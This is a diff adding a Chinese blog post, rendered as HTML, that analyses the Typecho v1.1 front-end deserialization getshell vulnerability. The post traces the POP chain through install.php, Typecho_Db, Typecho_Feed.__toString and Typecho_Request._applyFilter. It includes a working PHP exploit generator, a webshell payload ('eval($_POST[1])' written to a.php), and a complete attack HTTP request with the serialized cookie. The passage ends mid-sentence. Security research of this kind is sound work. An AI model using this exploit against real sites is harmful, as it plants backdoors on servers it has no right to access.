@@ -1,0 +1,512 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Typecho v1.1 前台Getshell漏洞分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Typecho v1.1 前台Getshell漏洞分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-11-25 23:54" pubdate>
+        2017年11月25日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Typecho v1.1 前台Getshell漏洞分析</h1>
+            
+            <div class="markdown-body">
+              <p>Typecho v1.1-15.5.12 前台反序列化可写Shell。<br>这个洞出了得有一个月了，当时出的时候想要审一下，但是PHP水平不太够，没审出来，于是等了等大牛们的博客。重新梳理了下流程，在此记录一下。</p>
+<a id="more"></a>
+
+<h2 id="0x00-源码下载"><a href="#0x00-源码下载" class="headerlink" title="0x00 源码下载"></a>0x00 源码下载</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta">https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta</a></p>
+</blockquote>
+<h2 id="0x01-Payload"><a href="#0x01-Payload" class="headerlink" title="0x01 Payload"></a>0x01 Payload</h2><h3 id="1-Exp生成脚本"><a href="#1-Exp生成脚本" class="headerlink" title="1. Exp生成脚本"></a>1. Exp生成脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS1 = <span class="hljs-string">&#x27;RSS 1.0&#x27;</span>;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">const</span> ATOM1 = <span class="hljs-string">&#x27;ATOM 1.0&#x27;</span>;<br>    <span class="hljs-keyword">const</span> DATE_RFC822 = <span class="hljs-string">&#x27;r&#x27;</span>;<br>    <span class="hljs-keyword">const</span> DATE_W3CDTF = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <span class="hljs-keyword">const</span> EOL = <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_charset</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_lang</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_version</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$version</span>, <span class="hljs-variable">$type</span> = <span class="hljs-built_in">self</span>::RSS2, <span class="hljs-variable">$charset</span> = <span class="hljs-string">&#x27;UTF-8&#x27;</span>, <span class="hljs-variable">$lang</span> = <span class="hljs-string">&#x27;en&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_version = <span class="hljs-variable">$version</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-variable">$type</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_charset = <span class="hljs-variable">$charset</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_lang = <span class="hljs-variable">$lang</span>;<br>    &#125;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$item</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[] = <span class="hljs-variable">$item</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;screenName&#x27;</span> =&gt; <span class="hljs-string">&quot;file_put_contents(&#x27;a.php&#x27;, &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;)&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$p1</span> = <span class="hljs-keyword">new</span> Typecho_Feed(<span class="hljs-number">1</span>);<br><span class="hljs-variable">$p2</span> = <span class="hljs-keyword">new</span> Typecho_Request();<br><span class="hljs-variable">$p1</span>-&gt;addItem(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;author&#x27;</span> =&gt; <span class="hljs-variable">$p2</span>));<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$p1</span>, <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;MengChen&#x27;</span>);<br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure>
+<h3 id="2-http请求包"><a href="#2-http请求包" class="headerlink" title="2. http请求包"></a>2. http请求包</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/typecho/install.php?finish=233</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.135<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIyOiIAVHlwZWNob19GZWVkAF9jaGFyc2V0IjtzOjU6IlVURi04IjtzOjE5OiIAVHlwZWNob19GZWVkAF9sYW5nIjtzOjI6ImVuIjtzOjIyOiIAVHlwZWNob19GZWVkAF92ZXJzaW9uIjtpOjE7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTQ6ImZpbGVfcHV0X2NvbnRlbnRzKCdhLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoiTWVuZ0NoZW4iO30=<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.135/typecho/install.php<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
+<p>效果就是会在网站目录下生成一个名为<code>a.php</code>的shell，密码为1</p>
+<h3 id="3-效果图"><a href="#3-效果图" class="headerlink" title="3. 效果图"></a>3. 效果图</h3><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1.png" srcset="/img/loading.gif"></p>
+<h2 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h2><h3 id="1-正向代码审计"><a href="#1-正向代码审计" class="headerlink" title="1. 正向代码审计"></a>1. 正向代码审计</h3><p>在<code>install.php</code>文件中，首先在第59-77行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="hljs-string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; empty(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;typecho&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-regexp">//</span> 挡掉可能的跨站请求<br><span class="hljs-keyword">if</span> (!empty(<span class="hljs-variable">$_GET</span>) || !empty(<span class="hljs-variable">$_POST</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$parts</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]);<br>	<span class="hljs-keyword">if</span> (!empty(<span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;port&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&quot;&#123;$parts[&#x27;host&#x27;]&#125;:&#123;$parts[&#x27;port&#x27;]&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>]) || <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>] != <span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>绕过这里需要用GET方法传入一个finish参数，然后再加入一个同源的Referer即可。</p>
+<p>然后往下，在第229-235行，存在一个很明显的反序列化操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$config</span> = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br>    Typecho_Cookie::delete(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>);<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> Typecho_Db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br>    <span class="hljs-variable">$db</span>-&gt;addServer(<span class="hljs-variable">$config</span>, Typecho_Db::READ | Typecho_Db::WRITE);<br>    Typecho_Db::set(<span class="hljs-variable">$db</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>在这里，可以通过<code>cookie</code>把一个序列化的变量反序列化后存入变量<code>$config</code>，然后在实例化<code>Typecho_Db</code>类时作为参数传入。全局搜索<code>Typecho_Db</code>类。</p>
+<p>文件路径为<code>/var/Typecho/Db.php</code>。</p>
+<p>在<code>Db.php</code>文件<code>Typecho_Db</code>类的构造函数中，第120行，存在一个字符串拼接操作</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$adapter</span>Name = <span class="hljs-string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="hljs-symbol">$adapter</span>Name;<br></code></pre></td></tr></table></figure>
+<p>假设<code>$adapterName</code>是一个实例化的类，那么在进行该操作时,会触发类的<code>__toString()</code>魔术方法。</p>
+<p>然后再寻找定义了<code>__toString()</code>方法的类。</p>
+<p>找到三个</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>Typecho/Config.php<br><span class="hljs-regexp">/var/</span>Typecho/Feed.php<br><span class="hljs-regexp">/var/</span>Typecho/Query.php<br></code></pre></td></tr></table></figure>
+<p>分别跟进进行审计。</p>
+<p>在<code>Feed.php</code>中，第290行<code>__toString()</code>方法中。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$content</span> .= <span class="hljs-string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="hljs-string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="hljs-keyword">self</span>::EOL;\<br></code></pre></td></tr></table></figure>
+<p>在这里调用了<code>Feed.php</code>中类<code>Typecho_Feed</code>的一个私有数组成员<code>$_items</code>的值，这个值我们可以控制，于是又用到了另一个魔术方法__get()。</p>
+<blockquote>
+<p>__get会在读取不可访问的属性的值的时候调用<br>无法访问的属性包括两类：不存在的属性、私有属性</p>
+</blockquote>
+<p>因此，我们可以通过该处调用某个类的__get()魔术方法。</p>
+<p>全局搜索下，分别跟进。</p>
+<p>在<code>/var/Typecho/Requests.php</code>中,<code>Typecho_Request</code>类里第269-272行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-variable">$key</span>);<br>&#125;<br>在这进入了第<span class="hljs-number">295</span><span class="hljs-number">-311</span>行，get()中<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">NULL</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-variable">$key</span>]):<br>            <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-variable">$key</span>];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$_httpParams</span>[<span class="hljs-variable">$key</span>]):<br>            <span class="hljs-variable">$value</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_httpParams</span>[<span class="hljs-variable">$key</span>];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable">$default</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$value</span> = !is_array(<span class="hljs-variable">$value</span>) &amp;&amp; strlen(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">0</span> ? <span class="hljs-variable">$value</span> : <span class="hljs-variable">$default</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_applyFilter(<span class="hljs-variable">$value</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>然后在第159行，进入_applyFilter()方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_applyFilter</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_filter) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_filter <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>            <span class="hljs-variable">$value</span> = is_array(<span class="hljs-variable">$value</span>) ? array_map(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>) :<br>            call_user_func(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">$this</span>-&gt;_filter = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在第164行，有个很醒目的<code>call_user_func()</code>函数。<br><code>call_user_func()</code>是PHP的内置函数，该函数允许用户调用直接写的函数并传入一定的参数，这里就是代码执行的地方。</p>
+<h3 id="2-Payload构造逻辑"><a href="#2-Payload构造逻辑" class="headerlink" title="2. Payload构造逻辑"></a>2. Payload构造逻辑</h3><p>首先，我们利用<code>cookie</code>传入一个序列化后的数组，数组中有个键为<code>&#39;adapter&#39;</code>、值为一个实例化的<code>Typecho_Feed()</code>类的键值对。</p>
+<p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2.png" srcset="/img/loading.gif"></p>
+<p>在实例化<code>Typecho_Db</code>类时，实例化后的<code>Typecho_Feed</code>类在<code>Db.php</code>中第120行进行了字符串拼接操作，调用了<code>Typecho_Feed</code>类的<code>__toString()</code>方法。</p>
+<p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3.png" srcset="/img/loading.gif"></p>
+<p>于是进入了<code>Feed.php</code>第223行的<code>__toString()</code>方法中。在类<code>Typecho_Feed()</code>类中有个私有化数组成员<code>$_items</code>,<br>在第284行对该数组进行了遍历，然后在第290行对<code>$item[&#39;author&#39;]</code>这个实例化的<code>screenName</code>成员进行操作。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$content</span> .= <span class="hljs-string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="hljs-string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="hljs-keyword">self</span>::EOL;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4.png" srcset="/img/loading.gif"></p>
+<p>如果<code>$item[&#39;author&#39;]</code>这个实例化的类中没有<code>screenName</code>这个成员或者这个成员是私有的，则会调用该实例化类的<code>__get()</code>魔术方法，<br>并且<code>$item[&#39;author&#39;]</code>这个类我们是可以控制的，因此令它为<code>Typecho_Request</code>这个类，因为<code>Typecho_Request</code>中没有<code>screenName</code>这个成员<br>然后就调用的<code>screenName</code>的<code>__get()</code>魔术方法，传入了一个值为<code>screenName</code>的<code>$key</code>，进入<code>Request.php</code>第295行<code>Typecho_Request</code>类的<code>$_params[]</code>中。</p>
+<p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5.png" srcset="/img/loading.gif"></p>
+<p>有键为<code>screenName</code>的键值对，就将它的值传入<code>$value</code>中，然后进入了<code>_applyFilter()</code>这个方法中，如果类<code>Typecho_Request</code>的成员<code>_filter</code>存在，就将其的值遍历作为函数名。<br>传入<code>call_user_func($filter, $value);</code>中，而<code>get()</code>方法中处理的<code>$value</code>就作为所执行函数的值传入其中`。于此代码执行</p>
+<p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6.png" srcset="/img/loading.gif"></p>
+<p>简单的说，在这个流程中，<code>call_user_func()</code>函数的两个参数我们都可控，<br>于是在此构成了任意代码执行。</p>
+<p>整个POP链就是</p>
